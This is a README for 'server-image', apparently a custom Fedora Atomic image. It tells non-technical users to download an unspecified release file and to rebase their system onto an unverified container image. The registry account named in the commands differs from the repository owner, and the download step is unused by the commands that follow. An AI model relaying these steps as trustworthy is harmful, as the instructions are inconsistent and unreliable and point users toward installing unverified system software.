# 🚀 server-image - Simplifying Your Image-Based Experience

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/eryaguero/server-image/releases)

## 🌟 Introduction

Welcome to the server-image repository! This software helps you rebase your existing atomic Fedora installation with the latest image. It provides a straightforward way to keep your operating system up to date. Follow the steps below to download and run the software without any technical knowledge.

## 📜 Features

- Easy installation and updates for Fedora users.
- Support for custom images tailored to your needs.
- Streamlined process using RPM-OSTree.
- Designed for simplicity, even for non-technical users.

## 💻 System Requirements

To use server-image, you need:

- A computer with Fedora installed.
- Access to the terminal.
- Basic knowledge of how to use commands.

## 🚀 Getting Started

### Step 1: Visit the Releases Page

To get the latest version of server-image, visit the [Releases Page](https://github.com/eryaguero/server-image/releases). 

Here, you will find the latest builds ready for download. 

### Step 2: Download the Latest Release

Look for the latest version on the page. Click the link to download the image file. This is usually labeled with a version number.

When you download, ensure you have enough space on your computer for the file.

### Step 3: Open the Terminal

After downloading, open the terminal on your Fedora system. You can find the terminal by searching in your applications or pressing `Ctrl + Alt + T`.

### Step 4: Rebase to the Unsigned Image

In the terminal, type the following command to rebase to the unsigned image:

```
rpm-ostree rebase ostree-unverified-registry:ghcr.io/royaloughtness/server-image:latest
```

This command enables the proper signing keys and policies.

### Step 5: Reboot Your System

Once the rebase is complete, reboot your system to apply the changes. Use this command in the terminal:

```
systemctl reboot
```

### Step 6: Rebase to the Signed Image

After your system restarts, open the terminal again. This time, rebase to the signed image using:

```
rpm-ostree rebase ostree-public-registry:ghcr.io/royaloughtness/server-image:latest
```

This command ensures that your image is verified and secure.

## 🔧 Usage

Once you have completed the steps above, your system will be running the latest version of the server-image. You can check the current version using the following command:

```
rpm-ostree status
```

This command shows you the details about your operating system and the image you are using.

## 🔄 Update Process

To keep your system up to date, regularly check the [Releases Page](https://github.com/eryaguero/server-image/releases) for new versions. You can follow the same steps to rebase to future releases.

## ❓ Troubleshooting

If you encounter any issues:

- Check your internet connection.
- Ensure that you have administrative rights to run commands.
- Refer to the [BlueBuild docs](https://blue-build.org/how-to/setup/) for additional guidance on setup and usage.

## 📞 Support

For further assistance, you can raise an issue in this repository or ask questions in the community forums related to Fedora. 

Make sure to explain your issue clearly for the best support.

## 💼 License

This project is licensed under the MIT License. Feel free to modify and distribute it according to the terms outlined in the license.

## 👍 Acknowledgments

Thank you for choosing server-image! We appreciate your support and look forward to your contributions and feedback.

Remember to download the latest version by clicking the button below:

[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/eryaguero/server-image/releases)